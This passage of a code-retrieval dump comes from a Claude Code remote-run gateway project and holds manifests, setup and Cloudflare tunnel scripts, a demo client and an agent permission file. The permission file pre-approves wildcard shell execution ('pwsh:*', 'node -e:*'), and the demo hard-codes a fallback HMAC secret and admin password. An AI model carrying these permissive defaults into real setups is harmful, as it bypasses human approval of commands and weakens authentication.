\"ai-runner\": \"dist/cli.js\"\n      },\n      \"devDependencies\": {\n        \"@types/node\": \"^20.10.6\",\n        \"@types/ws\": \"^8.5.10\",\n        \"tsx\": \"^4.7.0\",\n        \"typescript\": \"^5.3.3\",\n        \"vitest\": \"^1.1.3\"\n      }\n    }\n  }\n}", "metadata": {"file": "package-lock.json", "start_line": 6201, "end_line": 6271, "language": "json"}}, {"corpus": "code", "source": "package.json", "location": "package.json:1", "score": 0.0, "content": "{\n  \"name\": \"ai-remote-coder\",\n  \"version\": \"1.1.0\",\n  \"description\": \"Connect-Back Progress + Assist Gateway for Claude Code\",\n  \"private\": true,\n  \"type\": \"module\",\n  \"workspaces\": [\n    \"gateway\",\n    \"wrapper\",\n    \"ui\"\n  ],\n  \"scripts\": {\n    \"dev\": \"concurrently \\\"npm run dev:gateway\\\" \\\"npm run dev:ui\\\"\",\n    \"dev:gateway\": \"npm run dev -w gateway\",\n    \"dev:ui\": \"npm run dev -w ui\",\n    \"build\": \"npm run build -w gateway && npm run build -w wrapper && npm run build -w ui\",\n    \"start\": \"npm run start -w gateway\",\n    \"test\": \"npm run test -w gateway && npm run test -w wrapper\",\n    \"setup\": \"npm install && npm run build\",\n    \"prune\": \"node scripts/prune.mjs\"\n  },\n  \"devDependencies\": {\n    \"concurrently\": \"^8.2.2\",\n    \"typescript\": \"^5.3.3\"\n  },\n  \"engines\": {\n    \"node\": \">=20.0.0\"\n  }\n}", "metadata": {"file": "package.json", "start_line": 1, "end_line": 29, "language": "json"}}, {"corpus": "code", "source": "run.ps1", "location": "run.ps1:1", "score": 0.0, "content": "#!/usr/bin/env pwsh\n$ErrorActionPreference = \"Stop\"\n$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\nSet-Location $ScriptDir\n\nWrite-Host \"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\" -ForegroundColor Blue\nWrite-Host \"\u2551         Claude Code Connect-Back Gateway                      \u2551\" -ForegroundColor Blue\nWrite-Host \"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\" -ForegroundColor Blue\nWrite-Host\n\n# Check Node.js\ntry {\n    $nodeVersion = (node -v) -replace 'v', ''\n    $majorVersion = [int]($nodeVersion.Split('.')[0])\n    if ($majorVersion -lt 20) {\n        Write-Host \"Error: Node.js 20+ required (found v$nodeVersion)\" -ForegroundColor Red\n        exit 1\n    }\n} catch {\n    Write-Host \"Error: Node.js is not installed\" -ForegroundColor Red\n    Write-Host \"Please install Node.js 20+ from https://nodejs.org\"\n    exit 1\n}\n\n# Create .env if needed\nif (-not (Test-Path \".env\")) {\n    Write-Host \"Creating .env file with secure defaults...\" -ForegroundColor Yellow\n\n    $hmacSecret = -join ((1..64) | ForEach-Object { '{0:x}' -f (Get-Random -Maximum 16) })\n    $authSecret = -join ((1..64) | ForEach-Object { '{0:x}' -f (Get-Random -Maximum 16) })\n\n    $envContent = @\"\n# Gateway Configuration\nGATEWAY_PORT=3100\nGATEWAY_HOST=0.0.0.0\n\n# Security\nHMAC_SECRET=$hmacSecret\nAUTH_SECRET=$authSecret\n\n# TLS (generate with: .\\scripts\\dev-cert.ps1)\nTLS_ENABLED=true\n\n# Cloudflare Access (optional)\n# CF_ACCESS_TEAM=your-team\n# CF_ACCESS_AUD=your-aud\n\n# Retention\nRUN_RETENTION_DAYS=30\n\n# Wrapper Configuration\nGATEWAY_URL=https://localhost:3100\nALLOW_SELF_SIGNED=true\n\"@\n    $envContent | Out-File -FilePath \".env\" -Encoding utf8\n\n    Write-Host \"Generated .env with secure secrets\" -ForegroundColor Green\n}\n\n# Install dependencies\nif (-not (Test-Path \"node_modules\")) {\n    Write-Host \"Installing dependencies...\" -ForegroundColor Blue\n    npm install\n}\n\n# Build if needed\nif (-not (Test-Path \"gateway\\dist\") -or -not (Test-Path \"ui\\dist\")) {\n    Write-Host \"Building...\" -ForegroundColor Blue\n    npm run build\n}\n\n# Generate dev certs if needed\nif (-not (Test-Path \".data\\certs\\server.crt\")) {\n    Write-Host \"Generating development TLS certificates...\" -ForegroundColor Yellow\n    & .\\scripts\\dev-cert.ps1\n}\n\n# Create data directories\nNew-Item -ItemType Directory -Force -Path \".data\\db\", \".data\\artifacts\", \".data\\runs\", \".data\\certs\" | Out-Null\n\nWrite-Host\nWrite-Host \"Starting gateway server...\" -ForegroundColor Green\nWrite-Host \"Gateway: \" -NoNewline\nWrite-Host \"https://localhost:3100\" -ForegroundColor Blue\nWrite-Host \"WebSocket: \" -NoNewline\nWrite-Host \"wss://localhost:3100/ws\" -ForegroundColor Blue\nWrite-Host\n\nWrite-Host \"To expose via Cloudflare Tunnel:\" -ForegroundColor Yellow\nWrite-Host \"  .\\scripts\\cloudflare-tunnel.ps1\"\nWrite-Host\n\nWrite-Host \"To start a Claude Code run:\" -ForegroundColor Yellow\nWrite-Host \"  1. Create a run from the UI (get run-id and token)\"\nWrite-Host \"  2. Run: .\\wrapper\\ai-runner start --run-id <id> --token <token>\"\nWrite-Host\n\n# Start gateway\nnpm run start -w gateway", "metadata": {"file": "run.ps1", "start_line": 1, "end_line": 99, "language": "ps1"}}, {"corpus": "code", "source": "run.sh", "location": "run.sh:1", "score": 0.0, "content": "#!/usr/bin/env bash\nset -euo pipefail\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\ncd \"$SCRIPT_DIR\"\n\n# Colors\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nBLUE='\\033[0;34m'\nNC='\\033[0m'\n\necho -e \"${BLUE}\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557${NC}\"\necho -e \"${BLUE}\u2551         Claude Code Connect-Back Gateway                      \u2551${NC}\"\necho -e \"${BLUE}\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d${NC}\"\necho\n\n# Check Node.js version\nif ! command -v node &> /dev/null; then\n    echo -e \"${RED}Error: Node.js is not installed${NC}\"\n    echo \"Please install Node.js 20+ from https://nodejs.org\"\n    exit 1\nfi\n\nNODE_VERSION=$(node -v | cut -d'v' -f2 | cut -d'.' -f1)\nif [ \"$NODE_VERSION\" -lt 20 ]; then\n    echo -e \"${RED}Error: Node.js 20+ required (found v${NODE_VERSION})${NC}\"\n    exit 1\nfi\n\n# Check for .env file\nif [ ! -f \".env\" ]; then\n    echo -e \"${YELLOW}Creating .env file with secure defaults...${NC}\"\n    cat > .env << 'EOF'\n# Gateway Configuration\nGATEWAY_PORT=3100\nGATEWAY_HOST=0.0.0.0\n\n# Security (auto-generated if not set)\nHMAC_SECRET=\nAUTH_SECRET=\n\n# TLS (generate with: ./scripts/dev-cert.sh)\nTLS_ENABLED=true\n\n# Cloudflare Access (optional)\n# CF_ACCESS_TEAM=your-team\n# CF_ACCESS_AUD=your-aud\n\n# Retention\nRUN_RETENTION_DAYS=30\n\n# Wrapper Configuration\nGATEWAY_URL=https://localhost:3100\nALLOW_SELF_SIGNED=true\nEOF\n\n    # Generate secrets\n    HMAC_SECRET=$(openssl rand -hex 32 2>/dev/null || head -c 64 /dev/urandom | xxd -p | tr -d '\\n')\n    AUTH_SECRET=$(openssl rand -hex 32 2>/dev/null || head -c 64 /dev/urandom | xxd -p | tr -d '\\n')\n\n    sed -i.bak \"s/^HMAC_SECRET=$/HMAC_SECRET=${HMAC_SECRET}/\" .env\n    sed -i.bak \"s/^AUTH_SECRET=$/AUTH_SECRET=${AUTH_SECRET}/\" .env\n    rm -f .env.bak\n\n    echo -e \"${GREEN}Generated .env with secure secrets${NC}\"\nfi\n\n# Install dependencies if needed\nif [ ! -d \"node_modules\" ]; then\n    echo -e \"${BLUE}Installing dependencies...${NC}\"\n    npm install\nfi\n\n# Build if needed\nif [ ! -d \"gateway/dist\" ] || [ ! -d \"ui/dist\" ]; then\n    echo -e \"${BLUE}Building...${NC}\"\n    npm run build\nfi\n\n# Generate dev certs if needed\nif [ ! -f \".data/certs/server.crt\" ]; then\n    echo -e \"${YELLOW}Generating development TLS certificates...${NC}\"\n    ./scripts/dev-cert.sh\nfi\n\n# Create data directories\nmkdir -p .data/{db,artifacts,runs,certs}\n\necho\necho -e \"${GREEN}Starting gateway server...${NC}\"\necho -e \"Gateway: ${BLUE}https://localhost:3100${NC}\"\necho -e \"WebSocket: ${BLUE}wss://localhost:3100/ws${NC}\"\necho\necho -e \"${YELLOW}To expose via Cloudflare Tunnel:${NC}\"\necho -e \"  ./scripts/cloudflare-tunnel.sh\"\necho\necho -e \"${YELLOW}To start a Claude Code run:${NC}\"\necho -e \"  1. Create a run from the UI (get run-id and token)\"\necho -e \"  2. Run: ./wrapper/claude-runner start --run-id <id> --token <token>\"\necho\n\n# Start gateway\nexec npm run start -w gateway", "metadata": {"file": "run.sh", "start_line": 1, "end_line": 105, "language": "sh"}}, {"corpus": "code", "source": ".claude/settings.local.json", "location": ".claude/settings.local.json:1", "score": 0.0, "content": "{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(git rebase main)\",\n      \"Bash(git rebase --continue)\",\n      \"Bash(git add gateway/src/routes/runs.ts gateway/src/services/database.ts)\",\n      \"Bash(git checkout --ours gateway/src/routes/runs.ts gateway/src/services/database.ts)\",\n      \"Bash(git commit -m \\\"$\\\\(cat <<''EOF''\\nMerge remote-tracking branch ''origin/claude/agent-workflow-control-lcT6M'' keeping local changes\\n\\nCo-Authored-By: Claude \\\\(glm-4.7:cloud\\\\) <noreply@anthropic.com>\\nEOF\\n\\\\)\\\")\",\n      \"Bash(npm test)\",\n      \"Bash(npm install)\",\n      \"Bash(npm run build)\",\n      \"Bash(npm run lint)\",\n      \"Bash(npm run)\",\n      \"Bash(npm audit)\",\n      \"Bash(npm audit fix)\",\n      \"WebFetch(domain:github.com)\",\n      \"WebSearch\",\n      \"Bash(npm test -- wrapper/src/services/worker-registry.test.ts)\",\n      \"Bash(npm test -- services/worker-registry.test.ts)\",\n      \"Bash(npm test -- services/generic-runner.test.ts)\",\n      \"Bash(npm test -- services/base-runner.test.ts)\",\n      \"Bash(node -c base-runner.test.ts)\",\n      \"Bash(pwsh:*)\",\n      \"Bash(npm test:*)\",\n      \"Bash(node -e:*)\",\n      \"Bash(node test-paths.js:*)\",\n      \"Bash(node test-paths.mjs:*)\",\n      \"Bash(npm install:*)\",\n      \"Bash(npm run build:*)\",\n      \"Bash(git add:*)\",\n      \"Bash(git commit:*)\",\n      \"Bash(grep:*)\",\n      \"Bash(npx tsc:*)\"\n    ]\n  }\n}", "metadata": {"file": ".claude/settings.local.json", "start_line": 1, "end_line": 36, "language": "json"}}, {"corpus": "code", "source": "gateway/package.json", "location": "gateway/package.json:1", "score": 0.0, "content": "{\n  \"name\": \"@ai-remote-coder/gateway\",\n  \"version\": \"1.0.0\",\n  \"type\": \"module\",\n  \"main\": \"dist/index.js\",\n  \"scripts\": {\n    \"dev\": \"tsx watch src/index.ts\",\n    \"build\": \"tsc\",\n    \"start\": \"node dist/index.js\",\n    \"test\": \"vitest run\",\n    \"test:watch\": \"vitest\"\n  },\n  \"dependencies\": {\n    \"@fastify/cookie\": \"^9.2.0\",\n    \"@fastify/cors\": \"^9.0.1\",\n    \"@fastify/helmet\": \"^11.1.1\",\n    \"@fastify/multipart\": \"^8.1.0\",\n    \"@fastify/rate-limit\": \"^9.1.0\",\n    \"@fastify/static\": \"^7.0.1\",\n    \"@fastify/websocket\": \"^10.0.1\",\n    \"argon2\": \"^0.31.2\",\n    \"better-sqlite3\": \"^11.3.0\",\n    \"dotenv\": \"^16.3.1\",\n    \"fastify\": \"^4.25.2\",\n    \"nanoid\": \"^5.0.4\",\n    \"otplib\": \"^12.0.1\",\n    \"pino\": \"^8.17.2\",\n    \"pino-pretty\": \"^10.3.1\",\n    \"zod\": \"^3.22.4\"\n  },\n  \"devDependencies\": {\n    \"@types/better-sqlite3\": \"^7.6.8\",\n    \"@types/node\": \"^20.10.6\",\n    \"@types/ws\": \"^8.5.10\",\n    \"tsx\": \"^4.7.0\",\n    \"typescript\": \"^5.3.3\",\n    \"vitest\": \"^1.1.3\"\n  }\n}", "metadata": {"file": "gateway/package.json", "start_line": 1, "end_line": 39, "language": "json"}}, {"corpus": "code", "source": "gateway/tsconfig.json", "location": "gateway/tsconfig.json:1", "score": 0.0, "content": "{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"lib\": [\"ES2022\"],\n    \"outDir\": \"dist\",\n    \"rootDir\": \"src\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"sourceMap\": true,\n    \"resolveJsonModule\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\"]\n}", "metadata": {"file": "gateway/tsconfig.json", "start_line": 1, "end_line": 20, "language": "json"}}, {"corpus": "code", "source": "gateway/vitest.config.ts", "location": "gateway/vitest.config.ts:1", "score": 0.0, "content": "import { defineConfig } from 'vitest/config';\n\nexport default defineConfig({\n  test: {\n    globals: true,\n    environment: 'node',\n    include: ['src/**/*.test.ts'],\n    coverage: {\n      reporter: ['text', 'html'],\n      exclude: ['node_modules/', 'dist/']\n    }\n  }\n});", "metadata": {"file": "gateway/vitest.config.ts", "start_line": 1, "end_line": 13, "language": "ts"}}, {"corpus": "code", "source": "scripts/cloudflare-tunnel.ps1", "location": "scripts/cloudflare-tunnel.ps1:1", "score": 0.0, "content": "#!/usr/bin/env pwsh\n$ErrorActionPreference = \"Stop\"\n\nWrite-Host \"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\" -ForegroundColor Blue\nWrite-Host \"\u2551         Cloudflare Tunnel Setup                               \u2551\" -ForegroundColor Blue\nWrite-Host \"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\" -ForegroundColor Blue\nWrite-Host\n\n# Check for cloudflared\n$cloudflared = Get-Command cloudflared -ErrorAction SilentlyContinue\nif (-not $cloudflared) {\n    Write-Host \"cloudflared is not installed.\" -ForegroundColor Red\n    Write-Host\n    Write-Host \"Install with:\"\n    Write-Host \"  winget install Cloudflare.cloudflared\"\n    Write-Host\n    Write-Host \"Or download from:\"\n    Write-Host \"  https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation\"\n    exit 1\n}\n\n# Check if authenticated\ntry {\n    cloudflared tunnel list 2>&1 | Out-Null\n} catch {\n    Write-Host \"Not authenticated with Cloudflare. Running login...\" -ForegroundColor Yellow\n    cloudflared tunnel login\n}\n\n$TunnelName = \"airemotecoder-$env:COMPUTERNAME\"\n$LocalUrl = \"https://localhost:3100\"\n\nWrite-Host \"Checking for existing tunnel...\"\n\n# Get tunnel list\n$tunnels = cloudflared tunnel list --output json 2>$null | ConvertFrom-Json\n$existingTunnel = $tunnels | Where-Object { $_.name -eq $TunnelName } | Select-Object -First 1\n\nif (-not $existingTunnel) {\n    Write-Host \"Creating new tunnel: $TunnelName\" -ForegroundColor Green\n    cloudflared tunnel create $TunnelName\n}\n\nWrite-Host\nWrite-Host \"Starting tunnel...\" -ForegroundColor Green\nWrite-Host \"Your gateway will be available at the URL shown below.\"\nWrite-Host\nWrite-Host \"To add Cloudflare Access protection:\" -ForegroundColor Yellow\nWrite-Host \"  1. Go to https://one.dash.cloudflare.com\"\nWrite-Host \"  2. Navigate to Access > Applications\"\nWrite-Host \"  3. Create an application for your tunnel hostname\"\nWrite-Host \"  4. Set up your identity provider and access policies\"\nWrite-Host\n\n# Run the tunnel\ncloudflared tunnel --url $LocalUrl run $TunnelName", "metadata": {"file": "scripts/cloudflare-tunnel.ps1", "start_line": 1, "end_line": 56, "language": "ps1"}}, {"corpus": "code", "source": "scripts/cloudflare-tunnel.sh", "location": "scripts/cloudflare-tunnel.sh:1", "score": 0.0, "content": "#!/usr/bin/env bash\nset -euo pipefail\n\necho \"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\"\necho \"\u2551         Cloudflare Tunnel Setup                               \u2551\"\necho \"\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\"\necho\n\n# Check for cloudflared\nif ! command -v cloudflared &> /dev/null; then\n    echo \"cloudflared is not installed.\"\n    echo\n    echo \"Install instructions:\"\n    echo \"  macOS:   brew install cloudflared\"\n    echo \"  Linux:   See https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation\"\n    echo \"  Windows: winget install Cloudflare.cloudflared\"\n    echo\n    exit 1\nfi\n\n# Check if authenticated\nif ! cloudflared tunnel list &> /dev/null 2>&1; then\n    echo \"Not authenticated with Cloudflare. Running login...\"\n    cloudflared tunnel login\nfi\n\nTUNNEL_NAME=\"airemotecoder-$(hostname)\"\nLOCAL_URL=\"https://localhost:3100\"\n\necho \"Checking for existing tunnel...\"\n\n# Check if tunnel exists\nTUNNEL_ID=$(cloudflared tunnel list --output json 2>/dev/null | grep -o \"\\\"id\\\":\\\"[^\\\"]*\\\"\" | head -1 | cut -d'\"' -f4 || true)\n\nif [ -z \"$TUNNEL_ID\" ]; then\n    echo \"Creating new tunnel: $TUNNEL_NAME\"\n    cloudflared tunnel create \"$TUNNEL_NAME\"\n    TUNNEL_ID=$(cloudflared tunnel list --output json | grep -o \"\\\"id\\\":\\\"[^\\\"]*\\\"\" | head -1 | cut -d'\"' -f4)\nfi\n\necho \"Tunnel ID: $TUNNEL_ID\"\necho\n\n# Get tunnel URL\necho \"Starting tunnel...\"\necho \"Your gateway will be available at the URL shown below.\"\necho\necho \"To add Cloudflare Access protection:\"\necho \"  1. Go to https://one.dash.cloudflare.com\"\necho \"  2. Navigate to Access > Applications\"\necho \"  3. Create an application for your tunnel hostname\"\necho \"  4. Set up your identity provider and access policies\"\necho\n\n# Run the tunnel\ncloudflared tunnel --url \"$LOCAL_URL\" run \"$TUNNEL_NAME\"", "metadata": {"file": "scripts/cloudflare-tunnel.sh", "start_line": 1, "end_line": 56, "language": "sh"}}, {"corpus": "code", "source": "scripts/demo-multi-client.ts", "location": "scripts/demo-multi-client.ts:1", "score": 0.0, "content": "#!/usr/bin/env npx ts-node --esm\n/**\n * Multi-Client Demo Script\n *\n * This script simulates multiple clients connecting to the gateway\n * and streaming logs to test the mobile-friendly multi-client UI.\n *\n * Usage:\n *   cd /path/to/AiRemoteCoder\n *   npx ts-node --esm scripts/demo-multi-client.ts\n *\n * Prerequisites:\n *   1. Gateway must be running (npm run dev in gateway/)\n *   2. Set up admin user if not done: http://localhost:3100\n *\n * What it does:\n *   1. Creates 2 simulated clients (dev-laptop, build-server)\n *   2. Each client registers with the gateway\n *   3. Creates 2 runs per client (4 total)\n *   4. Streams simulated log output to each run\n *   5. Demonstrates multi-client dashboard view\n */\n\nimport crypto from 'crypto';\n\nconst GATEWAY_URL = process.env.GATEWAY_URL || 'http://localhost:3100';\nconst HMAC_SECRET = process.env.HMAC_SECRET || 'development-secret';\n\n// Client configurations\nconst CLIENTS = [\n  {\n    agentId: 'demo-dev-laptop-001',\n    displayName: 'dev-laptop',\n    version: '1.0.0',\n    capabilities: ['npm test', 'git diff', 'git status'],\n  },\n  {\n    agentId: 'demo-build-server-002',\n    displayName: 'build-server',\n    version: '1.0.0',\n    capabilities: ['npm test', 'npm run build', 'pytest'],\n  },\n];\n\n// Sample log messages to stream\nconst LOG_MESSAGES = [\n  { type: 'stdout', data: 'Starting process...' },\n  { type: 'stdout', data: 'Loading configuration...' },\n  { type: 'stdout', data: 'Connecting to database...' },\n  { type: 'stdout', data: 'Database connection established' },\n  { type: 'stdout', data: 'Initializing modules...' },\n  { type: 'stdout', data: '  - Module A initialized' },\n  { type: 'stdout', data: '  - Module B initialized' },\n  { type: 'stdout', data: '  - Module C initialized' },\n  { type: 'stdout', data: 'Running tests...' },\n  { type: 'stdout', data: '  PASS  src/utils.test.ts' },\n  { type: 'stdout', data: '  PASS  src/api.test.ts' },\n  { type: 'stderr', data: 'Warning: Deprecated function called' },\n  { type: 'stdout', data: '  PASS  src/database.test.ts' },\n  { type: 'stdout', data: 'Test Suites: 3 passed, 3 total' },\n  { type: 'stdout', data: 'Tests:       12 passed, 12 total' },\n  { type: 'stdout', data: 'Snapshots:   0 total' },\n  { type: 'stdout', data: 'Time:        4.521s' },\n  { type: 'stdout', data: '' },\n  { type: 'stdout', data: 'Building project...' },\n  { type: 'stdout', data: 'Compiling TypeScript...' },\n  { type: 'stdout', data: '  [1/4] Compiling src/index.ts' },\n  { type: 'stdout', data: '  [2/4] Compiling src/utils.ts' },\n  { type: 'stdout', data: '  [3/4] Compiling src/api.ts' },\n  { type: 'stdout', data: '  [4/4] Compiling src/database.ts' },\n  { type: 'stdout', data: 'Bundle created: dist/bundle.js (245 KB)' },\n  { type: 'stdout', data: 'Build completed successfully!' },\n];\n\ninterface RunInfo {\n  id: string;\n  capabilityToken: string;\n  clientId: string;\n  clientName: string;\n}\n\n// Create HMAC signature for wrapper authentication\nfunction createSignature(\n  method: string,\n  path: string,\n  body: string,\n  timestamp: number,\n  nonce: string,\n  runId: string,\n  capabilityToken: string\n): string {\n  const bodyHash = crypto.createHash('sha256').update(body).digest('hex');\n  const message = `${method}\\n${path}\\n${bodyHash}\\n${timestamp}\\n${nonce}\\n${runId}\\n${capabilityToken}`;\n  return crypto.createHmac('sha256', HMAC_SECRET).update(message).digest('hex');\n}\n\n// Make authenticated request as wrapper\nasync function wrapperRequest(\n  method: string,\n  path: string,\n  body: object | null,\n  runId: string,\n  capabilityToken: string\n): Promise<any> {\n  const timestamp = Math.floor(Date.now() / 1000);\n  const nonce = crypto.randomBytes(16).toString('hex');\n  const bodyStr = body ? JSON.stringify(body) : '';\n\n  const signature = createSignature(\n    method,\n    path,\n    bodyStr,\n    timestamp,\n    nonce,\n    runId,\n    capabilityToken\n  );\n\n  const headers: Record<string, string> = {\n    'Content-Type': 'application/json',\n    'X-Signature': signature,\n    'X-Timestamp': String(timestamp),\n    'X-Nonce': nonce,\n    'X-Run-Id': runId,\n    'X-Capability-Token': capabilityToken,\n  };\n\n  const res = await fetch(`${GATEWAY_URL}${path}`, {\n    method,\n    headers,\n    body: bodyStr || undefined,\n  });\n\n  if (!res.ok) {\n    const error = await res.text();\n    throw new Error(`Request failed: ${res.status} ${error}`);\n  }\n\n  return res.json();\n}\n\n// Register a client\nasync function registerClient(client: typeof CLIENTS[0], runId: string, token: string): Promise<void> {\n  console.log(`  Registering client: ${client.displayName}`);\n\n  await wrapperRequest('POST', '/api/clients/register', client, runId, token);\n}\n\n// Send heartbeat for a client\nasync function sendHeartbeat(agentId: string, runId: string, token: string): Promise<void> {\n  await wrapperRequest('POST', '/api/clients/heartbeat', { agentId }, runId, token);\n}\n\n// Send an event to a run\nasync function sendEvent(\n  runId: string,\n  token: string,\n  type: string,\n  data: string,\n  sequence: number\n): Promise<void> {\n  await wrapperRequest('POST', '/api/ingest/event', { type, data, sequence }, runId, token);\n}\n\n// Get a session cookie by logging in (for UI operations)\nasync function getSession(): Promise<string | null> {\n  // First check if setup is required\n  const statusRes = await fetch(`${GATEWAY_URL}/api/auth/status`);\n  const status = await statusRes.json();\n\n  if (status.setupRequired) {\n    console.log('Setting up admin user...');\n    const setupRes = await fetch(`${GATEWAY_URL}/api/auth/setup`, {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({\n        username: 'admin',\n        password: 'demo-password-123',\n      }),\n    });\n    if (!setupRes.ok) {\n      console.error('Setup failed');\n      return null;\n    }\n    const cookies = setupRes.headers.get('set-cookie');\n    if (cookies) {\n      return cookies.split(';')[0];\n    }\n  }\n\n  // Try to login\n  const loginRes = await fetch(`${GATEWAY_URL}/api/auth/login`, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({\n      username: 'admin',\n      password: 'demo-password-123',\n    }),\n  });\n", "metadata": {"file": "scripts/demo-multi-client.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "scripts/demo-multi-client.ts", "location": "scripts/demo-multi-client.ts:201", "score": 0.0, "content": "  if (loginRes.ok) {\n    const cookies = loginRes.headers.get('set-cookie');\n    if (cookies) {\n      return cookies.split(';')[0];\n    }\n  }\n\n  return null;\n}\n\n// Create a run via UI API\nasync function createRun(\n  session: string,\n  label: string,\n  command: string,\n  agentId: string,\n  repoName: string\n): Promise<RunInfo> {\n  const res = await fetch(`${GATEWAY_URL}/api/runs`, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      Cookie: session,\n    },\n    body: JSON.stringify({\n      label,\n      command,\n      agentId,\n      repoName,\n    }),\n  });\n\n  if (!res.ok) {\n    throw new Error(`Failed to create run: ${await res.text()}`);\n  }\n\n  const data = await res.json();\n  return {\n    id: data.id,\n    capabilityToken: data.capabilityToken,\n    clientId: agentId,\n    clientName: label,\n  };\n}\n\n// Simulate a run with log streaming\nasync function simulateRun(run: RunInfo, messageSet: typeof LOG_MESSAGES): Promise<void> {\n  let sequence = 0;\n\n  // Send started marker\n  await sendEvent(run.id, run.capabilityToken, 'marker', JSON.stringify({ event: 'started' }), sequence++);\n\n  // Stream log messages with delays\n  for (const msg of messageSet) {\n    await sendEvent(run.id, run.capabilityToken, msg.type, msg.data, sequence++);\n    await sleep(100 + Math.random() * 200); // 100-300ms between messages\n  }\n\n  // Random chance of failure for demo\n  const failed = Math.random() < 0.2;\n  const exitCode = failed ? 1 : 0;\n\n  if (failed) {\n    await sendEvent(run.id, run.capabilityToken, 'stderr', 'Error: Process failed unexpectedly', sequence++);\n  }\n\n  // Send finished marker\n  await sendEvent(\n    run.id,\n    run.capabilityToken,\n    'marker',\n    JSON.stringify({ event: 'finished', exitCode }),\n    sequence++\n  );\n}\n\nfunction sleep(ms: number): Promise<void> {\n  return new Promise((resolve) => setTimeout(resolve, ms));\n}\n\n// Main demo function\nasync function main() {\n  console.log('='.repeat(60));\n  console.log('Multi-Client Demo for Connect-Back Gateway');\n  console.log('='.repeat(60));\n  console.log();\n  console.log(`Gateway URL: ${GATEWAY_URL}`);\n  console.log();\n\n  // Get 